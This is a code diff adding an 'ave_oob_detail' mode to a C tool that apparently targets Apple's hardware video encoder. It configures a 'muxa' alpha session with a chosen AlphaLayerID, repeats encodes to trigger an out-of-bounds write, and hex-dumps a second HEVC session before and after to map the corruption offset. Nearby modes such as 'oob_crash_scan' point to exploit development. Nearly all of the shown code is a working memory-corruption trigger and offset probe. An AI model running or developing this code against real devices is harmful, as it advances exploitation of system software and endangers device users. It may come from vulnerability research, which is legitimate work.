@@ -8102,6 +8102,189 @@ vps_cd_done:
 
         rlog("\n=== AVE_SELF_CORRUPT complete ===\n");
 
+    } else if (strcmp(mode, "ave_oob_detail") == 0) {
+        /*
+         * ave_oob_detail — Detailed OOB corruption analysis
+         *
+         * Creates 1 trigger (muxa) + 2 target (HEVC) sessions.
+         * Dumps full NAL hex before and after OOB trigger.
+         * Also dumps pset data to see exactly which VPS fields changed.
+         * Tests multiple AlphaLayerID values to map corruption offset.
+         */
+        int alpha_id = (argc > 2) ? atoi(argv[2]) : 128;
+        int trigger_encodes = (argc > 3) ? atoi(argv[3]) : 170;
+        if (alpha_id < 1) alpha_id = 1;
+        if (alpha_id > 200) alpha_id = 200;
+
+        rlog("=== AVE_OOB_DETAIL: AlphaLayerID=%d, trigger_encodes=%d ===\n\n",
+            alpha_id, trigger_encodes);
+
+        /* Create target session first (standard HEVC) */
+        VTCompressionSessionRef target = NULL;
+        {
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus s = VTCompressionSessionCreate(NULL, 192, 192,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &target);
+            CFRelease(es);
+            if (s != noErr || !target) { rlog("FAIL: target create %d\n", (int)s); goto done; }
+            VTSessionSetProperty(target, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            s = VTCompressionSessionPrepareToEncodeFrames(target);
+            if (s != noErr) { rlog("FAIL: target prepare %d\n", (int)s); goto done; }
+        }
+        rlog("Target session (HEVC) created\n");
+
+        /* Create trigger session (muxa + alpha) */
+        VTCompressionSessionRef trigger = NULL;
+        {
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus s = VTCompressionSessionCreate(NULL, 192, 192,
+                (CMVideoCodecType)0x6D757861, es, NULL, NULL, encode_cb, NULL, &trigger);
+            CFRelease(es);
+            if (s != noErr || !trigger) { rlog("FAIL: trigger create %d\n", (int)s); goto done; }
+            VTSessionSetProperty(trigger, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            VTSessionSetProperty(trigger, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &alpha_id);
+            VTSessionSetProperty(trigger, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+            s = VTCompressionSessionPrepareToEncodeFrames(trigger);
+            if (s != noErr) { rlog("FAIL: trigger prepare %d\n", (int)s); goto done; }
+        }
+        rlog("Trigger session (muxa, AID=%d) created\n\n", alpha_id);
+
+        /* Baseline encode on target */
+        rlog("--- Baseline encode on target ---\n");
+        uint8_t baseline_nal[4096]; size_t baseline_nal_len = 0;
+        size_t baseline_total = 0, baseline_psets = 0, baseline_pset_bytes = 0;
+        {
+            g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (pb) {
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *b = CVPixelBufferGetBaseAddress(pb);
+                if (b) memset(b, 0x80, CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                VTCompressionSessionEncodeFrame(target, pb, CMTimeMake(0, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(target, kCMTimePositiveInfinity);
+                for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                CVPixelBufferRelease(pb);
+            }
+            baseline_total = g_last_nal_size;
+            baseline_psets = g_last_pset_count;
+            baseline_pset_bytes = g_last_pset_total_bytes;
+            baseline_nal_len = g_saved_nal_len < sizeof(baseline_nal) ? g_saved_nal_len : sizeof(baseline_nal);
+            memcpy(baseline_nal, (const void *)g_saved_nal, baseline_nal_len);
+            rlog("status=%d total_nal=%zu psets=%zu pset_bytes=%zu\n",
+                (int)g_cb_status, baseline_total, baseline_psets, baseline_pset_bytes);
+            rlog("NAL hex (%zu bytes):\n", baseline_nal_len);
+            for (size_t off = 0; off < baseline_nal_len && off < 256; off += 16) {
+                rlog("  %04zx: ", off);
+                for (size_t j = 0; j < 16 && off+j < baseline_nal_len; j++)
+                    rlog("%02x ", baseline_nal[off+j]);
+                rlog("\n");
+            }
+            if (g_saved_fmt) {
+                rlog("Parameter sets:\n");
+                for (size_t p = 0; p < baseline_psets; p++) {
+                    const uint8_t *pdata = NULL; size_t plen = 0;
+                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                        g_saved_fmt, p, &pdata, &plen, NULL, NULL);
+                    rlog("  pset[%zu] len=%zu: ", p, plen);
+                    for (size_t j = 0; j < plen && j < 64; j++) rlog("%02x ", pdata[j]);
+                    rlog("\n");
+                }
+            }
+        }
+
+        /* Trigger OOB */
+        rlog("\n--- Trigger %d encodes on trigger session (AID=%d) ---\n", trigger_encodes, alpha_id);
+        {
+            int tok = 0;
+            for (int e = 0; e < trigger_encodes; e++) {
+                g_encode_done = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *b = CVPixelBufferGetBaseAddress(pb);
+                    if (b) memset(b, (uint8_t)(e & 0xFF), CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    OSStatus es = VTCompressionSessionEncodeFrame(trigger, pb,
+                        CMTimeMake(e + 1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    if (es == noErr) tok++;
+                    CVPixelBufferRelease(pb);
+                }
+            }
+            VTCompressionSessionCompleteFrames(trigger, kCMTimePositiveInfinity);
+            rlog("ok=%d / %d\n", tok, trigger_encodes);
+        }
+
+        /* Post-OOB encode on target */
+        rlog("\n--- Post-OOB encode on target ---\n");
+        {
+            g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (pb) {
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *b = CVPixelBufferGetBaseAddress(pb);
+                if (b) memset(b, 0x80, CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                VTCompressionSessionEncodeFrame(target, pb, CMTimeMake(1, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(target, kCMTimePositiveInfinity);
+                for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                CVPixelBufferRelease(pb);
+            }
+            rlog("status=%d total_nal=%zu psets=%zu pset_bytes=%zu\n",
+                (int)g_cb_status, g_last_nal_size, g_last_pset_count, g_last_pset_total_bytes);
+            rlog("NAL hex (%zu bytes):\n", g_saved_nal_len);
+            for (size_t off = 0; off < g_saved_nal_len && off < 256; off += 16) {
+                rlog("  %04zx: ", off);
+                for (size_t j = 0; j < 16 && off+j < g_saved_nal_len; j++)
+                    rlog("%02x ", g_saved_nal[off+j]);
+                rlog("\n");
+            }
+            if (g_saved_fmt) {
+                rlog("Parameter sets:\n");
+                for (size_t p = 0; p < g_last_pset_count; p++) {
+                    const uint8_t *pdata = NULL; size_t plen = 0;
+                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                        g_saved_fmt, p, &pdata, &plen, NULL, NULL);
+                    rlog("  pset[%zu] len=%zu: ", p, plen);
+                    for (size_t j = 0; j < plen && j < 64; j++) rlog("%02x ", pdata[j]);
+                    rlog("\n");
+                }
+            }
+            /* Diff */
+            rlog("\n--- Diff summary ---\n");
+            rlog("NAL size: %zu -> %zu (%s)\n", baseline_total, g_last_nal_size,
+                (baseline_total == g_last_nal_size) ? "SAME" : "CHANGED");
+            rlog("Pset count: %zu -> %zu\n", baseline_psets, g_last_pset_count);
+            rlog("Pset bytes: %zu -> %zu\n", baseline_pset_bytes, g_last_pset_total_bytes);
+            size_t min_len = baseline_nal_len < g_saved_nal_len ? baseline_nal_len : g_saved_nal_len;
+            int first_diff = -1;
+            for (size_t d = 0; d < min_len; d++) {
+                if (baseline_nal[d] != g_saved_nal[d]) { first_diff = (int)d; break; }
+            }
+            if (first_diff >= 0)
+                rlog("First byte diff at offset %d: 0x%02x -> 0x%02x\n",
+                    first_diff, baseline_nal[first_diff], g_saved_nal[first_diff]);
+            else if (baseline_nal_len != g_saved_nal_len)
+                rlog("Content same up to min length, but sizes differ\n");
+            else
+                rlog("NAL content identical\n");
+        }
+
+        VTCompressionSessionInvalidate(trigger); CFRelease(trigger);
+        VTCompressionSessionInvalidate(target); CFRelease(target);
+        rlog("\n=== AVE_OOB_DETAIL complete ===\n");
+
     } else if (strcmp(mode, "oob_crash_scan") == 0) {
         /*
          * oob_crash_scan — Find which OOB index hits critical struct fields
